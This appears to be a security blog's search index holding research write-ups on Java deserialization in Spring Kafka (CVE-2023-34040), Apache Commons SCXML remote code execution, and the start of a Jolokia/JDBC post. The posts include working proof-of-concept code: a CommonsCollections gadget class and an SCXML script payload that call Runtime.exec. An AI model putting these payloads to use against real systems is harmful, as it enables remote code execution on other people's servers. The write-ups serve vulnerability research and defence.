<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Java Deserialization Vulnerability Still Alive</title>
      <link href="/2023/10/20/Java-Deserialization-Vulnerability-Still-Alive/"/>
      <url>/2023/10/20/Java-Deserialization-Vulnerability-Still-Alive/</url>
      
        <content type="html"><![CDATA[<p>Several months ago, the Constrast Security Team reported a Java deserialization vulnerability about Spring Kafka to VMWare Security Team. It immediately attracted my attention and I got started to analyse this bug. If you are interested in it, you could look up the details in my previous blog.</p><p><a href="https://blog.pyn3rd.com/2023/09/15/CVE-2023-34040-Spring-Kafka-Deserialization-Remote-Code-Execution">https://blog.pyn3rd.com/2023/09/15/CVE-2023-34040-Spring-Kafka-Deserialization-Remote-Code-Execution</a></p><p>After analyzing explicitly, I consider it a thought-provoking report. Hence, I instantly write this blog down.</p><p>Java deserialization vulnerability is on the top of the list when it comes to Java Security. I would like to talk about that with the recent Java deserialization vulnerability of Spring Kafka.</p><p>People have been likely to know the fundamental reason is unsafe serialization stream from users without verification contributes to remote code execution. </p><p>A majority of Java applications have more or less paid attention to the deserialization vulnerability, like Weblogic Server, Apache Shiro. As far as I’m conernted, overwriting the <code>ObjectInputStream</code> function becomes widespread use for defending against Java deserialization attack. It could make this problem alleviated. When overwriting the <code>ObjectInputStream</code>, the <code>resolveClass</code> would be hooked and potentially dangerous functions revoking might be found out. </p><p>Actually, Spring Kafka also utilizes the same way to defend against Java deserialization vulnerability. Observe the Java fragment up close.</p><p><img src="/images/pasted-277.png" alt="upload successful"></p><p>Although the defensive programming apparentlly existing,  why still does the Java deserialization vulnerability take place in Spring Kafka?  I guess the confusion has manifested in someone’s face in front of the screen.</p><ul><li>Customize ObjectInputStream &amp; Hook resolveClass</li></ul><p>I just supply a demonstration with an overwritten <code>ObjectInputStream</code> function.Then, I attempt to deserialize the malicious deserialization stream.</p><p><img src="/images/pasted-278.png" alt="upload successful"></p><p>Insecure attempt has been blocked successfully.</p><p><img src="/images/pasted-279.png" alt="upload successful"></p><p>Then I mimic Spring Kafka’s code thoroughly. I replace the class <code>DeserializationException.class </code>with<code>  Person.class</code>to make you aware that the exeception would be thrown. </p><p><img src="/images/pasted-280.png" alt="upload successful"></p><p>Consequently, I could simply escape this verification in a way of encapsulation. After initializating  <code>CustomExceptionClass</code> , it could be inputted  into  the instance of <code>DeserializationExeception</code> as an argument.</p><p><img src="/images/pasted-281.png" alt="upload successful"></p><p>Last step is to embed  the <code>CommonCollection6</code> gadget  in a static code block.</p><p><img src="/images/pasted-283.png" alt="upload successful"></p><p>In conclusion, the weakness of customized <code>ObjectInputStream</code> contributes to Spring Kafka deserialization vulnerability. It only verifies the top layer function in stack.</p><p><img src="/images/pasted-282.png" alt="upload successful"></p><p>Apart from the the way to customize <code>ObjectInputStream</code>function, there are some other choices for defence.</p><ul><li><p>ValidatingObjectInputStream in Apache Commons IO library </p><p>The Apache Commons IO library contains utility classes, stream implementations, etc. It offers a function <code>ValidatingObjectInputStream</code> to only allow the specific classes to be deserialized, equal to a whitelist.</p><p>Besides the classes in the whitelist, any class could not be deserialized! As you see, the class <code>org.springframework.kafka.support.serializer.DeserializationException</code>has been blocked, because it’s not included in the whitelist.</p></li></ul><p><img src="/images/pasted-284.png" alt="upload successful"></p><ul><li><p>JEP290</p><p>JEP290 is a JDK-based detective pragramming. It provides a flexible mechanism to prevent Java applications from deserialization attack.</p><p>Developers could customize a particular class as the filter. It permits the classes to be deserialized or not. In my illustration, the class <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> would be blocked.</p></li></ul><p><img src="/images/pasted-285.png" alt="upload successful"></p><p>Unfortunately,  this mechanism more or less has some shortages. I intend to talk about it next time. </p><p><img src="/images/pasted-286.png" alt="upload successful"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2023-34040 Spring Kafka Deserialization Remote Code Execution</title>
      <link href="/2023/09/15/CVE-2023-34040-Spring-Kafka-Deserialization-Remote-Code-Execution/"/>
      <url>/2023/09/15/CVE-2023-34040-Spring-Kafka-Deserialization-Remote-Code-Execution/</url>
      
        <content type="html"><![CDATA[<h5 id="0x01-Preface"><a href="#0x01-Preface" class="headerlink" title="0x01 Preface"></a>0x01 Preface</h5><p>Here is the explicit description about Spring Kafka deserialization vulnerability in Vmware security bulletin.</p><p><img src="/images/pasted-258.png" alt="upload successful"></p><p>Reference</p><p><a href="https://spring.io/security/cve-2023-34040">https://spring.io/security/cve-2023-34040</a></p><p>According to the description in security bulletin, we can simply attain some critical points resulting in the vulnerability.</p><ol><li><p>Setting the <code>ErrorHandlingDeserializer</code> as a key and/or value in the Kafka record in configuration.</p></li><li><p>Setting the boolean type properties <code>checkDeserExWhenKeyNull</code> and/or <code> checkDeserExWhenValueNull</code> to <strong>true</strong>.</p></li><li><p>The users can publish a Kafka topic without any verification.</p></li></ol><h5 id="0x02-Concepts-of-Kafka"><a href="#0x02-Concepts-of-Kafka" class="headerlink" title="0x02 Concepts of Kafka"></a>0x02 Concepts of Kafka</h5><p>Before deeply diving into the vulnerability, we promptly review some relevant concepts of the Kafka service.</p><p><img src="https://media.geeksforgeeks.org/wp-content/uploads/20220214105957/SpringBootProducerConsumer.jpg" alt="img"></p><ul><li><p>Producer：we call the object for publishing record <strong>Kafka topic producer</strong></p></li><li><p>Topic：The records are classified by the Kafka service, and each classification is named <strong>Topic</strong>.</p></li></ul><ul><li>Broker：The published messages are stored in a group of servers, we call it Kafka cluster. Each of the server is a <strong>Broker</strong>. The consumer can attain the data form <strong>Broker</strong> and consume more than one topic.</li></ul><ul><li>Consumer：The object which is used to subscribe message and handle with the published message is called <strong>Kafka topi consumer</strong>. The consumption messages are topic based.</li></ul><p>Moreover,it is necessary to review the structure of Kafka record.</p><p><img src="/images/pasted-259.png" alt="upload successful"></p><p>Kafka Record, we also call it <strong>Message</strong> or <strong>Event</strong> consisting of <strong>Header</strong> and <strong>Body</strong>. The header data virtually equals to <strong>Metadata</strong> including the basic elements like Topic, Patition and Timestamp. They are stored as a pair of key/value. The body data usually are the relevant business data stored as key/value constructure as well.</p><h5 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h5><p>Zookeeper server is required before deploying Kafka service.</p><p>1.Installing Zookeeper server by docker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name zookeeper -p 2181:2181 -t zookeeper:latest</span><br></pre></td></tr></table></figure><p>2.Deploying Kafka server by docker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker run  -d --name kafka -p 9092:9092 \</span><br><span class="line">-e KAFKA_ZOOKEEPER_CONNECT=192.168.5.102:2181 \</span><br><span class="line">-e KAFKA_ADVERTISED_LISTENERS=PLAINTEXT://192.168.5.102:9092 \</span><br><span class="line">-e KAFKA_LISTENERS=PLAINTEXT://0.0.0.0:9092 \</span><br><span class="line">-e TZ=&quot;Asia/Shanghai&quot; \</span><br><span class="line">wurstmeister/kafka:latest</span><br></pre></td></tr></table></figure><p>3.Spring Boot project imports the affected Kafka dependencies</p><p>   Affected version：</p><ul><li>2.8.1 to 2.9.10</li><li>3.0.0 to 3.0.9</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.kafka&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-kafka&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;2.8.11&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>4.Updating the configuration in <code>application.yaml</code></p><p><img src="/images/pasted-260.png" alt="upload successful"></p><p>5.Classes for demonstration</p><p>1）Kafka Producer Class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">package com.example.SpringKafkaDemo.producer;</span><br><span class="line"></span><br><span class="line">import com.example.SpringKafkaDemo.model.KafkaMessage;</span><br><span class="line">import org.apache.kafka.clients.producer.ProducerRecord;</span><br><span class="line">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line">import org.springframework.kafka.core.KafkaTemplate;</span><br><span class="line">import org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line"></span><br><span class="line">@RestController</span><br><span class="line">public class KafkaProducer &#123;</span><br><span class="line"></span><br><span class="line">    @Autowired</span><br><span class="line">    private KafkaTemplate&lt;String, String&gt; kafkaTemplate;</span><br><span class="line"></span><br><span class="line">    @PostMapping(&quot;/message/send&quot;)</span><br><span class="line">    public String sendMessage(@RequestBody KafkaMessage message) &#123;</span><br><span class="line"></span><br><span class="line">        String topic = message.getTopic();</span><br><span class="line">        String data  = message.getData();</span><br><span class="line"></span><br><span class="line">       HashMap&lt;String, String&gt; headers = message.getHeaders();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ProducerRecord&lt;String, String&gt; producerRecord = new ProducerRecord&lt;&gt;(topic, data);</span><br><span class="line">        for (String s : headers.keySet()) &#123;</span><br><span class="line">            if (s.equals(&quot;springDeserializerExceptionKey&quot;)) &#123;</span><br><span class="line">                String exceptData = headers.get(s);</span><br><span class="line">                byte[] exceptHandler = KafkaProducer.hexStringtoBytes(exceptData);</span><br><span class="line">                producerRecord.headers().add(s, exceptHandler);</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            producerRecord.headers().add(s, headers.get(s).getBytes());</span><br><span class="line">        &#125;</span><br><span class="line">        kafkaTemplate.send(producerRecord);</span><br><span class="line">        String jsonString=&quot;&#123;\&quot;code\&quot;:\&quot;200\&quot;, \&quot;status\&quot;:\&quot;success\&quot;&#125;&quot;;</span><br><span class="line"></span><br><span class="line">        return jsonString;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    private static byte[] hexStringtoBytes(String hexString) &#123;</span><br><span class="line"></span><br><span class="line">        byte[] excepetionMessage = new byte[hexString.length() / 2];</span><br><span class="line">        for (int i = 0; i &lt; excepetionMessage.length; i++) &#123;</span><br><span class="line">            excepetionMessage[i] = (byte) Integer.parseInt(hexString.substring(i * 2, i * 2 + 2), 16);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        return excepetionMessage;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>By the way, here we use a type of design pattern in Java Language,  <strong>Template Method Pattern</strong>. In this demonstration, I insert a template named <code>kafkaTemplate</code>.</p><p>Highlight of the code fragment</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private KafkaTemplate&lt;String, String&gt; kafkaTemplate;</span><br></pre></td></tr></table></figure><p>2）Kafka Consumer Class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">package com.example.SpringKafkaDemo.consumer;</span><br><span class="line"></span><br><span class="line">import org.springframework.kafka.annotation.KafkaListener;</span><br><span class="line">import org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line">@Service</span><br><span class="line">public class KafkaConsumer &#123;</span><br><span class="line"></span><br><span class="line">    @KafkaListener(topics = &quot;my-topic&quot;, groupId = &quot;my-group-id&quot;)</span><br><span class="line">    public void consume(String message) &#123;</span><br><span class="line">        System.out.println(&quot;Received message: &quot; + message);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3）Config Class for the Consumer</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">package com.example.SpringKafkaDemo.config;</span><br><span class="line"></span><br><span class="line">import org.apache.kafka.clients.consumer.ConsumerConfig;</span><br><span class="line">import org.springframework.beans.factory.annotation.Value;</span><br><span class="line">import org.springframework.context.annotation.Bean;</span><br><span class="line">import org.springframework.context.annotation.Configuration;</span><br><span class="line">import org.springframework.kafka.annotation.EnableKafka;</span><br><span class="line">import org.springframework.kafka.config.ConcurrentKafkaListenerContainerFactory;</span><br><span class="line">import org.springframework.kafka.core.ConsumerFactory;</span><br><span class="line">import org.springframework.kafka.core.DefaultKafkaConsumerFactory;</span><br><span class="line">import org.springframework.kafka.support.serializer.JsonDeserializer;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">@Configuration</span><br><span class="line">@EnableKafka</span><br><span class="line">public class KafkaConsumerConfig &#123;</span><br><span class="line"></span><br><span class="line">    @Value(&quot;$&#123;spring.kafka.bootstrap-servers&#125;&quot;)</span><br><span class="line">    private String bootstrapServers;</span><br><span class="line"></span><br><span class="line">    @Value(&quot;$&#123;spring.kafka.consumer.group-id&#125;&quot;)</span><br><span class="line">    private String groupId;</span><br><span class="line"></span><br><span class="line">    @Bean</span><br><span class="line">    public Map&lt;String, Object&gt; consumerConfigs() &#123;</span><br><span class="line">        Map&lt;String, Object&gt; props = new HashMap&lt;&gt;();</span><br><span class="line">        props.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);</span><br><span class="line">        props.put(ConsumerConfig.GROUP_ID_CONFIG, groupId);</span><br><span class="line">        props.put(ConsumerConfig.AUTO_OFFSET_RESET_CONFIG, &quot;earliest&quot;);</span><br><span class="line">        props.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, JsonDeserializer.class);</span><br><span class="line">        props.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, JsonDeserializer.class);</span><br><span class="line">        return props;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Bean</span><br><span class="line">    public ConsumerFactory&lt;String, String&gt; consumerFactory() &#123;</span><br><span class="line">        return new DefaultKafkaConsumerFactory&lt;&gt;(consumerConfigs());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Bean</span><br><span class="line">    public ConcurrentKafkaListenerContainerFactory&lt;String, String&gt; kafkaListenerContainerFactory() &#123;</span><br><span class="line">        ConcurrentKafkaListenerContainerFactory&lt;String, String&gt; factory = new ConcurrentKafkaListenerContainerFactory&lt;&gt;();</span><br><span class="line">        factory.setConsumerFactory(consumerFactory());</span><br><span class="line">        factory.getContainerProperties().setCheckDeserExWhenKeyNull(true);</span><br><span class="line">        factory.getContainerProperties().setCheckDeserExWhenValueNull(true);</span><br><span class="line">        return factory;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In acordance with the vulnerablity description in official bulletin, we should set both the <code>checkDeserExWhenKeyNull</code> and <code>checkDeserExWhenValueNull</code> properties to <strong>true</strong>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">factory.getContainerProperties().setCheckDeserExWhenKeyNull(true)</span><br><span class="line">factory.getContainerProperties().setCheckDeserExWhenValueNull(true)</span><br></pre></td></tr></table></figure><p>Se the breakpoint at the <code>getExceptionFromHeader</code> function and then have the server start.</p><p><img src="/images/pasted-262.png" alt="upload successful"></p><p>Step into <code>invokeIfHaveRecords</code> function, the record object will be deserialized.</p><p><img src="/images/pasted-263.png" alt="upload successful"></p><p><img src="/images/pasted-264.png" alt="upload successful"></p><p>Back to the <code>getExceptionFromHeader</code> function.</p><p><img src="/images/pasted-265.png" alt="upload successful"></p><p>This function makes the value <code>springDeserializerExceptionKey</code> of <code>record.headers()</code> into the the value of the variables <code>headerName</code> and be delivered <code>header</code>.</p><p>And then deliver the value to <code>byteArrayToDeserializationException</code> function.</p><p><img src="/images/pasted-266.png" alt="upload successful"></p><p>Step into <code>byteArrayToDeserializationException</code> function.</p><p><img src="/images/pasted-267.png" alt="upload successful"></p><p>The <code>resolveClass</code> function is overrided to restrain arbitrary Java class  deserialization. Actually, we can find the way of preventing Java deserialization vulnerability in many projects, like Apache Shiro, Fastjson.</p><p><img src="/images/pasted-277.png" alt="upload successful"></p><p>Apparently, only the class<br><code>org.springframework.kafka.support.serializer.DeserializationException</code> can be deserialized.</p><p><img src="/images/pasted-269.png" alt="upload successful"></p><p>Step into <code>DeserializationException</code> function, it consists four arguments. One of them is <code>cause</code> which is used to invoke instantial class.</p><p><img src="/images/pasted-270.png" alt="upload successful"></p><p>Write a malicious class and make it inherit the parent class <code>Throwable</code>.</p><p><img src="/images/pasted-271.png" alt="upload successful"></p><p>Eventually, fill the value of the <code>springDeserializerExceptionKey</code> key  in JSON data with the generated Java serialization. The remote code execution is trigged after sending the HTTP request.</p><p><img src="/images/pasted-272.png" alt="upload successful"></p><p>In addition, we could exploit <code>CommonsCollections</code> gadget as well. Thus, the malicious class could be constructed as follow.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">package org.example.deserialization;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class CustomExceptionClass extends Throwable &#123;</span><br><span class="line"></span><br><span class="line">    // CommonCollection6 Gadget in Static Code Block</span><br><span class="line"></span><br><span class="line">    static &#123;</span><br><span class="line">        Transformer[] transformers=new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;,</span><br><span class="line">                        new Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,</span><br><span class="line">                        new Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;,</span><br><span class="line">                        new Class[]&#123;String.class&#125;,</span><br><span class="line">                        new Object[]&#123;&quot;open -a calculator&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, String&gt; innerMap= new HashMap&lt;&gt;();</span><br><span class="line">        innerMap.put(&quot;key&quot;,&quot;value&quot;);</span><br><span class="line"></span><br><span class="line">        Map&lt;String, String&gt; outerMap = TransformedMap.decorate(</span><br><span class="line">                innerMap,</span><br><span class="line">                null,</span><br><span class="line">                new ChainedTransformer(transformers));</span><br><span class="line"></span><br><span class="line">        outerMap.put(&quot;topic&quot;, &quot;test&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Proof-of-Content"><a href="#Proof-of-Content" class="headerlink" title="Proof of Content"></a>Proof of Content</h5><p><a href="https://github.com/pyn3rd/CVE-2023-34040">https://github.com/pyn3rd/CVE-2023-34040</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Apache Commons SCXML Remote Code Execution</title>
      <link href="/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/"/>
      <url>/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/</url>
      
        <content type="html"><![CDATA[<h5 id="0x01-Preface"><a href="#0x01-Preface" class="headerlink" title="0x01 Preface"></a>0x01 Preface</h5><ul><li>What is Apache Commons SCXML? </li></ul><p>Here is the Apache offical explanation.</p><p>State Chart XML (SCXML) is currently a Working Draft specification published by the World Wide Web Consortium (W3C). SCXML provides a generic state-machine based execution environment based on Harel State Tables. SCXML is a candidate for the control language within multiple markup languages coming out of the W3C (see the latest Working Draft for details). Commons SCXML is an implementation aimed at creating and maintaining a Java SCXML engine capable of executing a state machine defined using a SCXML document, while abstracting out the environment interfaces.</p><h5 id="0x02-How-to-find-it"><a href="#0x02-How-to-find-it" class="headerlink" title="0x02 How to find it"></a>0x02 How to find it</h5><p>When I audited the source code, I unintentionally found out a sensitive class named <code>SCXMLReader</code>.</p><p><img src="/images/pasted-241.png" alt="upload successful"></p><p>Then I kept on analysing the critical class <code>SCXMLReader</code>. The class consisted of serveral static methods, one of them named <code>read</code>, it could load a XML file by the parameter <code>scxmlPath</code>. However, the method did not verify the legal resource of the XML file, in the other words, it could load a XML file from any untrustworthy resource.</p><p><img src="/images/pasted-253.png" alt="upload successful"></p><p>Next, I stepped into the <code>readInternal</code> method, it tried to resovle the URL of the XML file.</p><p><img src="/images/pasted-244.png" alt="upload successful"></p><p>Obviously, it did not restrict the loading resource, and a remote resource can also be initialized.<br><img src="/images/pasted-255.png" alt="upload successful"></p><p>Then, I stepped into the <code>getReader</code> method, it tried to load the XML stream as input.<br><img src="/images/pasted-245.png" alt="upload successful"></p><p>If there is a URL as file path, the input stream will obtain from the URL resource.<br><img src="/images/pasted-256.png" alt="upload successful"></p><p>The XML stream will be returned finally.<br><img src="/images/pasted-246.png" alt="upload successful"></p><p>Next, I definitely should utilize some method to handle with the XML stream, here I convinced myself the method called <code>setStateMachine</code> was what I needed.<br><img src="/images/pasted-247.png" alt="upload successful"></p><p>Then I stepped into the method. We can see the initialization of the instance.<br><img src="/images/pasted-248.png" alt="upload successful"></p><p>At last, the instance was intialized and the Java Expression Lauguage in XML file was be executed by <code>getEvaluator</code> method.<br><img src="/images/pasted-249.png" alt="upload successful"></p><h5 id="0x03-Proof-of-Concept"><a href="#0x03-Proof-of-Concept" class="headerlink" title="0x03 Proof of Concept"></a>0x03 Proof of Concept</h5><p>By convention, I eventually demostrate it with the explicit PoC.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.scxml2.SCXMLExecutor;</span><br><span class="line">import org.apache.commons.scxml2.io.SCXMLReader;</span><br><span class="line">import org.apache.commons.scxml2.model.ModelException;</span><br><span class="line">import org.apache.commons.scxml2.model.SCXML;</span><br><span class="line"></span><br><span class="line">import javax.xml.stream.XMLStreamException;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class SCXMLDemo &#123;</span><br><span class="line">    public static void main(String[] args) throws ModelException, XMLStreamException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        // engine to execute the scxml instance</span><br><span class="line">        SCXMLExecutor executor = new SCXMLExecutor();</span><br><span class="line">        // parse SCXML URL into SCXML model</span><br><span class="line">        SCXML scxml = SCXMLReader.read(&quot;http://127.0.0.1:8000/poc.xml&quot;);</span><br><span class="line"></span><br><span class="line">        // set state machine (scxml instance) to execute</span><br><span class="line">        executor.setStateMachine(scxml);</span><br><span class="line">        executor.go();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>poc.xml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;scxml xmlns=&quot;http://www.w3.org/2005/07/scxml&quot; version=&quot;1.0&quot; initial=&quot;run&quot;&gt;</span><br><span class="line">&lt;state id=&quot;run&quot;&gt;</span><br><span class="line">&lt;onentry&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;open -a calculator&#x27;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/onentry&gt;</span><br><span class="line">&lt;/state&gt;</span><br><span class="line">&lt;/scxml&gt;</span><br></pre></td></tr></table></figure><p>The screenshot of this illustration.<br><img src="/images/pasted-237.png" alt="upload successful"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>A New Way of Jolokia Remote Code Execution</title>
      <link href="/2022/11/15/A-New-Way-of-Jolokia-Remote-Code-Execution/"/>
      <url>/2022/11/15/A-New-Way-of-Jolokia-Remote-Code-Execution/</url>
      
        <content type="html"><![CDATA[<h5 id="0x01-Preface"><a href="#0x01-Preface" class="headerlink" title="0x01 Preface"></a>0x01 Preface</h5><p>Last week, I saw an interesting case about JDBC attack reported by @JJaaskela in HackerOne. It caught my attention, so I intended to analyse this case.</p><p><img src="/images/pasted-230.png" alt="upload successful"></p><p>Here is the link of this report:</p><p><a href="https://hackerone.com/reports/1547877">https://hackerone.com/reports/1547877</a></p><p>Due to the bug fix, I cannot reproduce the vulnerablity. But I still can obtain some clues according to the description of this report.</p><p>Aiven is a next-generation managed cloud database service that hosts your software infrastructure services. It supports diverse kinds of data sources, like Apache Kafka, PostgresSQL, MySQL, Redis, etc. Obviously, JDBC connections exist in these scenarios.</p><p>The root causes of this vulnerablity are as follow:</p><ul><li><p>The reporter found the service supported Jolokia service according to the logs in web console, and the HTTP sink connector allowed user to send HTTP request to localhost, Jolokia service was listening on <code>localhost:6725</code> as well.</p></li><li><p>JMX exposes the Mbean called <code>com.sun.management:type=DiagnosticCommand</code>, it has a special operation named <code>jvmtiAgentLoad</code>.</p></li><li><p>The HTTP Sink 